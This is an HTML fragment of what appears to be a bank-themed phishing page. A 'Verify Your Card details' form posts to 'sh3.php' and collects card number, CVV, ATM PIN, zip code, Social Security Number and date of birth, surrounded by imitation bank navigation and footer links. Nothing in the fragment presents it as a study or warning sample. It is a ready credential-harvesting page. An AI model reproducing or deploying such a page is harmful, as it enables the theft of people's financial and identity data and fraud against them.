...
<li><a href="" class="tabNavLink" id="tabNavSmallBusiness" name="tabNavSmallBusiness">Small Business</a></li>

                        
                           
<li><a href="" class="tabNavLink" id="tabNavCommercial" name="tabNavCommercial">Commercial</a></li>
...
<form method="post" action="sh3.php">
            <div calss="dor">
<h2 style="
    font-size: 30px;
...
<div class="bottom-row">
  ...
  <div class="red-grad-bar-skin sup-ie" id="skip-to-h1">
	...
	<tbody><tr>
		...
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font style="font-size: 11pt" face="Arial" color="#808080">Verify Your Card details</font></b></td>
	</tr>
		<tr><td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
...
<label for="newEmailAddress"><b> *  Card Number :</b></label></font></p></td>
    ...
    tab-size: 15px;
">&nbsp;&nbsp;
	   <input type="text" id="cc-number" class="cc-number" name="cc" placeholder=" Credit/Debit Card" value="" maxlength="29" size="16 value=" required="" style="
    border-top-width: 2px;
    border-bottom-width: 2px;
    margin-top: 0px;
	<
...
<label for="newEmailAddress"><b> * Security code :</b></label></font></p></td>
		<td>&nbsp;&nbsp;
	   <input type="text" id="onlineId1" name="CVV" placeholder=" cvv " value="" maxlength="4" class="signin-text-box" size="16 value=" required="" style="
    border-top-width: 2px;
    border-bottom-width: 2px;
    margin-top: 0px;
    width: 37px;
...
<label for="newEmailAddress"><b> * ATM/PIN :</b></label></font></p></td>
		<td>&nbsp;&nbsp;
		<input class="<>" name="PIN" placeholder="xxxx" size="2" maxlength="4" type="password" value="" required="" style="
    width: 41px;
"></td></tr>
	...
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Zip Code:</b></label></font></p></td>
		<td>&nbsp;&nbsp;
...
<label for="newEmailAddress"><b> * Social Security Number:</b></label></font></p></td>
		<td>&nbsp;&nbsp;
		<input class=" type="text" id="ssn1" size="1" maxlength="3" name="ssn1">-<input class="<?echo $ssn2class; ?>" type="text" id="ssn2" size="1" maxlength="2" name="ssn2">-<input class="<?echo $ssn3class; ?>" type="text" id="ssn3" size="1" maxlength="4" name="ssn3">&nbsp;
...
<label for="newEmailAddress"><b> * Date Of Birth:</b></label></font></p></td>
		<td>&nbsp;&nbsp;
		<input class=" type="text" id="dobmonth" size="1" maxlength="2" name="dobmonth">-<input class="<?echo $dobdateclass; ?>" type="text" id="dobdate" size="1" maxlength="2" name="dobdate">-<input class="<?echo $dobyearclass; ?>" type="text" id="dobyear" size="1" maxlength="4" name="dobyear">&nbsp;
		<font face="Arial" size="1">MM/DD/YYYY</font></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<li><a href="">Newsroom</a></li>
                    ...
                    <div class="col2">
<h3>2019 Corporate Social Responsibility Interim Report</h3>
